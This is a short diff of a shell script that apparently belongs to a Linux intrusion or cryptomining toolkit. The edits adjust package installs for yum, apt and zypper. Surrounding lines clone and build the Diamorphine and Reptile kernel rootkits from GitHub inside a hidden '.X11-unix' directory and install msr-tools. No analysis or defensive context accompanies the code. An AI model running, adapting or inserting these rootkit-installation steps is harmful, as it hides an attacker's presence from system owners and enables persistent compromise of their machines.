@@ -643,9 +643,11 @@ rm -rf Reptile
 yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
 apt-get update -y
 apt-get reinstall kmod
-apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y
+apt-get install linux-generic linux-headers-$(uname -r) -y
+apt-get install git make gcc msr-tools build-essential libncurses-dev -y
+apt-get install linux-image-amd64 linux-headers-amd64 -y
 zypper update -y
-zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y
+zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev -y
 git clone https://github.com/m0nad/Diamorphine
 cd Diamorphine/
 make
@@ -660,7 +662,6 @@ cd .X11-unix
 rm -rf Diamorphine
 rm -rf Reptile
 apt-get update -y
-apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y
 yum update -y
 yum install -y ncurses-devel
 git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile
